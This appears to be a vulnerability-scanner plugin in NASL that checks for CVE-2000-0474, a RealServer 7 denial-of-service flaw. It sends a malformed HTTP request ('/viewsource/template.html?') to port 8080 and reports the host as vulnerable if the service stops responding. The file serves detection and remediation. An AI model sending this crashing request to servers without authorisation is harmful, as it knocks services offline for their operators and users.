if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10461" );
	script_version( "$Revision: 14336 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-19 15:53:10 +0100 (Tue, 19 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1288 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_cve_id( "CVE-2000-0474" );
	script_name( "Check for RealServer DoS" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2000 John Lampe....j_lampe@bellsouth.net" );
	script_dependencies( "find_service.sc" );
	script_require_ports( "Services/realserver", 7070, 8080 );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to the most recent version of RealServer" );
	script_tag( name: "summary", value: "It is possible to crash a RealServer version 7 by sending a malformed http
request." );
	exit( 0 );
}
require("http_func.inc.sc");
port = 8080;
if(get_port_state( port )){
	if(http_is_dead( port: port )){
		exit( 0 );
	}
	mysoc = http_open_socket( port );
	if( mysoc ){
		mystring = http_get( item: "/viewsource/template.html?", port: port );
		send( socket: mysoc, data: mystring );
	}
	else {
		exit( 0 );
	}
	http_close_socket( mysoc );
	if(http_is_dead( port: port )){
		security_message( port );
	}
}

